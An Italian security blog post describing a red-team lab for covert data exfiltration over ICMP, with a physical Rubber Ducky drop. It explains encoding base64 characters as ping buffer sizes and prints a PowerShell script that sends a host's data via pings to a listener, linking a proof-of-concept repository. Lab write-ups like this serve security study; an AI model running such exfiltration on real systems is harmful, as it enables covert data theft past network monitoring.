---
layout:     post
title:      "ICMP infostealing: il lab [prima parte]"
date:       2023-04-27 13:30:00 +0200
categories: [cyber-security, hacking, ita]
image:
---
Prima una premessa.

Sul piano operativo l'esecuzione di un attacco informatico che ha come obiettivo il furto di dati (Data Breach) diventa più efficace in proporzione alla quantità di informazioni relative al target di cui si può disporre. Alcune di queste informazioni posso essere raccolte grazie a tecniche come OSInt e Social Engeneering, altre possono essere trafugate direttamente dal target tramite delle azioni di ricognizione o attacchi meno rumorosi e progettati con il solo fine di raccogliere maggiorni informazioni sul target.

In questo contesto la possibilità di fare info stealing sul target diventa particolarmente appetibile: l'attacker potrebbe progettare azioni estremamente mirate utilizzando tecniche di data exfiltration per appropriarsi di pochi ma importanti dati da utilizzare in fasi successive dell'attacco.

Come sempre un esempio vale mille parole, ho quindi iniziato a lavorare su un lab per studiare meglio la tecnica. La sintesi di questo piccolo esperimento andrà a comporre un paper dedicato al tema.

## Scenario

Partiamo da un obiettivo semplice e concreto: estrarre informazioni dall'interno della rete target avendo la possibilità di accedere fisicamente ad un dispositivo della rete ma per un tempo limitato. I vincoli sono gli stessi che avrebbe un threat actor: ammesso che gli sia possibile accedere ai locali ed arrivare in prossimità di un sistema connesso alla rete (una workstation ad esempio) probabilmente avrà a disposizione relativamente poco tempo per eseguire delle operazioni.

Uno strumento comodo per questo scenario potrebbe essere una Rubber Ducky da collegare per pochi secondo alla macchina target. In questo caso avremmo la possibilità di eseguire qualche comando, limitatamente al tempo a disposizione, per inviarci un po' di informazioni.

Ovviamente le informazioni dobbiamo mandarle verso un sistema che siamo in grado di governare. In base al metodo di invio delle informazioni dovremo quindi predisporre un server che riceva i dati e ci permetta di visualizzare quanto raccolto.

<img src="{{ '/assets/images-posts/scenario-wifiduck-icmp.png' | relative_url }}" alt="scenario wifiduck icmp" style="float: left; width: 100%; max-width: 100%; margin-right: 20px; margin-bottom: 10px; border-radius: 4px;" />

ipotesi di scenario

Per il nostro lab. ho scelto come "canale" ICMP. E' una spece di sfida personale: in condizioni operative (parliamo quindi di Red Teaming o attività relative a Pen Testing) utilizzo canali un po' più usabili ma mi sono sempre chiesto fino a quanto potevo spingermi con ICMP. Il nostro server dovrà quindi ricevere pacchetti ICMP e per l'occasione utillizzerò il collaudatissimo scapy. Avremo quindi un piccolo python script che riceverà le sequenze ICMP e ricomporrà il messaggio.

La parte della costruzione del messaggio e della sua ricomposizione è l'unica che presenta una reale complessità (se così si può dire) in quanto va aggirato il fatto che il comando PING in ambienti Microsoft non consente di inserire un messaggio o un testo nel payload. L'unica variazione che possiamo permetterci è la dimensione del buffer.

L'idea è quindi quella di far corrispondere ad ogni carattere dell'output del comando un valore decimale che rappresenti il corrispettivo "DECIMALE" del carattere. Quindi il messaggio "AAAA" dovrà produrre quattro ping con dimensione del buffer 65 byte. Lo script che riceve i quattro ping dovrà prendere la seguenza di byte e ricomporla a formare il messaggio.

Aggiungiamo un po' di complessità: non mi piace particolarmente mandare il messaggio completamente in chiaro. Potrebbe essere relativamente semplice da "leggere". Prima di inviarlo eseguiamo un encode in base64 e di conseguenza inviaremo i caratteri della stringa dopo l'encode. Per una demo va più che bene, in un contesto reale potremmo valutare una vera e propria cifratura, il convetto di base è lo stesso.

## Demo

Il codice della p-o-c è disponibile nella mia repo e fa parte delle dimostrazioni in ambito C2. L'ho chiamata ping.pong: <https://github.com/roccosicilia/my-papers/tree/main/poc-c2/ping.pong>.

La demo di compone essenzialmente di due script:

- **pingpong.py** è il server ICMP che cattura (usa effetticamente la chiamata sniff) i pacchetti ICMP in ingresso e salva lo stream del messaggio in un file txt
- **readpong.py** è uno script che ho voluto tenere separato ricomporre il messaggio in arrivo e presentarlo in modo leggibile

A questi due script si aggiungono i comandi per la Rubber Ducky. Qui spazio alla fantasia, vi lascio comunque una possibile sequenza in formato ps1:

```
# target host
$ip = "192.168.1.2"
# data to exfil
$MYDATA = $("hostname")

# encode
$base64String = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($MYDATA))
Write-Output $base64String

# reset ping
ping -l 1 -n 1 $ip

# send message by ping
for ($i=0; $i -le $base64String.Length; $i++)
{
    $x = [int[]][char[]]$base64String[$i]
    ping -l $x -n 1 $ip
    Start-Sleep -Milliseconds 500
}
```

Un piccolo video dimostrativo:

https://www.youtube.com/watch?v=t0XwQ7vZxfE

---

L'argomento, nonostante sia tecnicamente semplice, ha richiesto un po' di studio e test che ho in parte fatto live [sul canale Twitch](https://www.twitch.tv/roccosicilia). Sto preparando una sintesi delle sessioni live e questa sera (27 aprile 2023) ci sarà una nuova sessione dedicata ai progressi ottenuti ed a qualche nuovo test.
